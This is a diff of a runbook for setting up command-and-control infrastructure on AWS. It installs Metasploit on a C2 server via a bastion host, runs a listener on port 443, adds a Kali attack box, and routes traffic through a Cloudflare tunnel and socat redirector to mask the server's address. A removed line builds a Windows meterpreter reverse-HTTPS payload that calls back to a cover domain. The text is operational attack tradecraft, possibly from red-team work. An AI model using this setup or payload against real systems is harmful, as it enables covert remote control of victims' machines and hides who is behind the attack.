@@ -136,7 +136,7 @@ cd /home/bastion/re-dependas && cp /home/bastion/c2-dependas/socat* /home/bastio
 # install Metasploit
 # [in web browser] Download metasploit installer from https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers. I had to download on personal and then upload to S3 in personal AWS account.
 # [in bastion host] set up msfconsole with the following:
-wget -O msf_installer.deb https://msf-dependas.s3.dualstack.us-west-1.amazonaws.com/msf_6.4.76_20250720_amd64.deb && ssh -i .ssh/internal.pem -o StrictHostKeyChecking=no c2server@$c2_ipv4 "mkdir -p /home/c2server/msf-dependas" && scp -i .ssh/internal.pem -o StrictHostKeyChecking=no -v /home/bastion/msf-dependas/msf_installer.deb c2server@$c2_ipv4:/home/c2server/msf-dependas && ssh -i .ssh/internal.pem -o StrictHostKeyChecking=no c2server@$c2_ipv4 "sudo dpkg -i /home/c2server/msf-dependas/*.deb"
+wget -O msf_installer.deb https://dandh-c2.s3.dualstack.us-west-1.amazonaws.com/msf_6.4.76_20250720_amd64.deb && ssh -i .ssh/internal.pem -o StrictHostKeyChecking=no c2server@$c2_ipv4 "mkdir -p /home/c2server/msf-dependas" && scp -i .ssh/internal.pem -o StrictHostKeyChecking=no -v /home/bastion/msf-dependas/msf_installer.deb c2server@$c2_ipv4:/home/c2server/msf-dependas && ssh -i .ssh/internal.pem -o StrictHostKeyChecking=no c2server@$c2_ipv4 "sudo dpkg -i /home/c2server/msf-dependas/*.deb"
 ssh -i .ssh/internal.pem c2server@$c2_ipv4
 msfconsole
 # Answer yes to: Would you like to use and setup a new database (recommended)? yes
@@ -152,13 +152,16 @@ set LHOST 127.0.0.1
 set LPORT 443
 set ExitOnSession false
 run -j
-ctrl+b, "
-msfvenom -p windows/meterpreter/reverse_https ReverseConnectHost=fmovies4.org LPORT=443 -f exe -o payload.exe
+ctrl+b, d
 
+# Step 6 Set up Attack Box
+# [Create a new EC2 instnace with a kali AMI from the AWS Marketplace
+wget -O msf_installer.deb https://dandh-c2.s3.dualstack.us-west-1.amazonaws.com/msf_6.4.76_20250720_amd64.deb && sudo dpkg -i msf_installer.deb
 
 # [in Redirector] Run Cloudflare Tunneling to mask your IPv6 address and redirect IPv6 traffic hitting Redirector to C2 Server
-tmux new -s cf_socat
-cloudflared --no-autoupdate --protocol http2 --edge-ip-version 6 tunnel run &
+tmux new -s redirector
+cloudflared --no-autoupdate --protocol http2 --edge-ip-version 6 tunnel run
+ctrl+b , "
 # Change $c2_ipv4
 sudo socat TCP6-LISTEN:443,reuseaddr,fork TCP4:$c2_ipv4:443 &
 ctrl+b, d
